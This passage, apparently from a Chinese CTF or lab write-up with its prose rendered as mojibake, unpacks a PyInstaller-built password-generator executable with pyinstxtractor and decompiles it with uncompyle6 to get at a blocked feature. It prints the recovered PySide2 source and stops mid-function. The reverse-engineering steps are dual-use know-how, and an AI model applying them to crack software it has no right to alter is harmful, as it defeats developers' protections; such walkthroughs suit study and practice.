passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æŠŠ<code>passwordGenerator</code>æ‹–åˆ°Windowsæœºå™¨ä¸­ï¼Œåç¼€åŠ ä¸Š<code>.exe</code>ï¼ŒåŒå‡»è¿è¡Œï¼Œå¦‚ä¸‹å·¦ä¾§å¯é€‰æ‹©passwordé•¿åº¦ï¼Œå³ä¾§æœ‰ä¸‰ä¸ªé€‰é¡¹<code>ALL Characters</code>ã€<code>Alphabetic</code>(å­—æ¯)ã€<code>Alphanumeric</code>(å­—æ¯æ•°å­—)ï¼Œå‰é¢æ‹¿åˆ°çš„æˆªå›¾æ˜¯ç¬¬ä¸€ä¸ªé€‰é¡¹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327165413416.png" style="zoom: 67%;">

<p>ç‚¹å‡»<code>Generate!</code>ï¼Œå¼¹çª—æç¤ºç”Ÿæˆpasswordså‰è¦æ›´æ”¹é»˜è®¤valuesï¼Œçœ‹æ¥æ˜¯ç”Ÿæˆä¸äº†ï¼Œå¾—æ›²çº¿æ•‘å›½ï¼Œç ´è§£å®ƒ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327165902638.png" style="zoom:67%;">

<h2 id="å…­ã€Pythonåç¼–è¯‘"><a href="#å…­ã€Pythonåç¼–è¯‘" class="headerlink" title="å…­ã€Pythonåç¼–è¯‘"></a>å…­ã€Pythonåç¼–è¯‘</h2><p>åœ¨Windowsç”¨WinHexï¼ˆå…¶ä»–16è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨å‡å¯ï¼‰æ‰“å¼€è¿™ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œåœ¨æœ«å°¾å¯ä»¥å‘ç°<code>pyinstaller</code>ç¼–è¯‘çš„æ ‡å¿—<code>MEI</code></p>
<p>pythonåç¼–è¯‘å‚è€ƒï¼š<a href="https://blog.51cto.com/u_15060540/3888913">https://blog.51cto.com/u_15060540/3888913</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327094458918.png" style="zoom:67%;">

<p>ä¸‹è½½<code>pyinstxtractor</code>è„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/extremecoders-re/pyinstxtractor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŠŠ<code>passwordGenerator</code>æ”¾åˆ°ä¸‹å¥½çš„è„šæœ¬åŒç›®å½•ä¸‹ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pyinstxtractor]
â””â”€# python3 pyinstxtractor.py passwordGenerator 
[+] Processing passwordGenerator
[+] Pyinstaller version: 2.1+
[+] Python version: 3.7
[+] Length of package: 34300131 bytes
[+] Found 95 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pyside2.pyc
[+] Possible entry point: passwordGenerator.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: passwordGenerator

You can now use a python decompiler on the pyc files within the extracted directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¼šåœ¨å½“å‰æ–‡ä»¶å¤¹è‡ªåŠ¨ç”Ÿæˆåå«<code>passwordGenerator_extracted</code>çš„ç›®å½•</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230327100100822.png" style="zoom:80%;">

<p>ç”¨<code>uncompyle6</code>åç¼–è¯‘ç›®æ ‡<code>.pyc</code>æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">pip install uncompyle6
uncompyle6 passwordGenerator.pyc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å¾—åˆ°æºç </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.9.0</span>
<span class="token comment"># Python bytecode version base 3.7.0 (3394)</span>
<span class="token comment"># Decompiled from: Python 3.9.1+ (default, Feb  5 2021, 13:46:56) </span>
<span class="token comment"># [GCC 10.2.1 20210110]</span>
<span class="token comment"># Embedded file name: passwordGenerator.py</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> PySide2 <span class="token keyword">import</span> QtWidgets
<span class="token keyword">import</span> pyperclip

<span class="token keyword">class</span> <span class="token class-name">Ui_MainWindow</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">setupUi</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> MainWindow<span class="token punctuation">.</span>objectName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            MainWindow<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token number">560</span><span class="token punctuation">,</span> <span class="token number">408</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>centralwidget <span class="token operator">=</span> QWidget<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'centralwidget'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">411</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_2'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'generate'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">330</span><span class="token punctuation">,</span> <span class="token number">261</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength <span class="token operator">=</span> QSpinBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'PasswordLength'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setMinimum<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>setMaximum<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'copyButton'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">460</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_4'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox <span class="token operator">=</span> QCheckBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'checkBox'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setCheckable<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setChecked<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setTristate<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox <span class="token operator">=</span> QComboBox<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>addItem<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'comboBox'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5 <span class="token operator">=</span> QTextBrowser<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'textBrowser_5'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field <span class="token operator">=</span> QLineEdit<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'password_field'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span>QRect<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">351</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>setCentralWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>centralwidget<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>statusbar <span class="token operator">=</span> QStatusBar<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>statusbar<span class="token punctuation">.</span>setObjectName<span class="token punctuation">(</span><span class="token string">'statusbar'</span><span class="token punctuation">)</span>
        MainWindow<span class="token punctuation">.</span>setStatusBar<span class="token punctuation">(</span>self<span class="token punctuation">.</span>statusbar<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>retranslateUi<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>
        QMetaObject<span class="token punctuation">.</span>connectSlotsByName<span class="token punctuation">(</span>MainWindow<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">retranslateUi</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>
        MainWindow<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>title<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:20pt;"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_2<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Generate!'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Copy'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_4<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Hide Password&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'All Characters'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Alphabetic'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>setItemText<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'Alphanumeric'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setDocumentTitle<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>textBrowser_5<span class="token punctuation">.</span>setHtml<span class="token punctuation">(</span>QCoreApplication<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token string">'MainWindow'</span><span class="token punctuation">,</span> <span class="token string">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;\n&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;\np, li { white-space: pre-wrap; }\n&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;\n&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:16pt;"&gt;characters&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">MainWindow</span><span class="token punctuation">(</span>QMainWindow<span class="token punctuation">,</span> Ui_MainWindow<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>MainWindow<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setupUi<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setFixedSize<span class="token punctuation">(</span>QSize<span class="token punctuation">(</span><span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Secure Password Generator'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setReadOnly<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>passlen<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>chars<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>hide<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>gen<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">passlen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>PasswordLength<span class="token punctuation">.</span>valueChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>lenpass<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">lenpass</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> value
        value <span class="token operator">=</span> l

    <span class="token keyword">def</span> <span class="token function">chars</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>comboBox<span class="token punctuation">.</span>currentIndexChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>charss<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">charss</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> index
        index <span class="token operator">=</span> i

    <span class="token keyword">def</span> <span class="token function">hide</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>checkBox<span class="token punctuation">.</span>stateChanged<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>status<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">status</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> status
        status <span class="token operator">=</span> s <span class="token operator">==</span> Qt<span class="token punctuation">.</span>Checked

    <span class="token keyword">def</span> <span class="token function">copy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>copyButton<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>copied<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">copied</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        pyperclip<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">gen</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>generate<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>genButton<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">genButton</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            hide <span class="token operator">=</span> status
            <span class="token keyword">if</span> hide<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setEchoMode<span class="token punctuation">(</span>QLineEdit<span class="token punctuation">.</span>Password<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setEchoMode<span class="token punctuation">(</span>QLineEdit<span class="token punctuation">.</span>Normal<span class="token punctuation">)</span>
            password <span class="token operator">=</span> self<span class="token punctuation">.</span>genPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>password_field<span class="token punctuation">.</span>setText<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            msg <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
            msg<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">'Warning'</span><span class="token punctuation">)</span>
            msg<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'Change the default values before generating passwords!'</span><span class="token punctuation">)</span>
            x <span class="token operator">=</span> msg<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">genPassword</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> value
        char <span class="token operator">=</span> index
        <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            charset <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&amp;*()_-+={}[]|:;&lt;&gt;,.?'</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
